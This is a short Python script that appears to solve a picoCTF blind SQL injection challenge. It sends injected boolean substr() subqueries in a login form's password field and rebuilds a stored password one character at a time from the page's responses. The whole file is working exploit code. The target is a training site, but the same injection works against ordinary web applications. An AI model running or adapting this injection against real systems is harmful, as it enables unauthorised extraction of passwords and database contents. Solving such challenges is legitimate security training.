#!/usr/bin/env python

import requests
from string import printable
accum=""
for i in range(40):
  for letter in printable:
    accum+=letter
    r = requests.post("http://primer.picoctf.com/vuln/web/blindsql.php?&username=WeDontCare&password=' or '"
    + letter+"'=( select substr(binary password,"+str(i)+",1) from pico_blind_injection where id=1 ) and ''= '")
    if 'NOTHING FOUND...' in r.text:
      accum=accum[:-1]
      #print "nope"
    else:
      print "We found the character: "+letter
print accum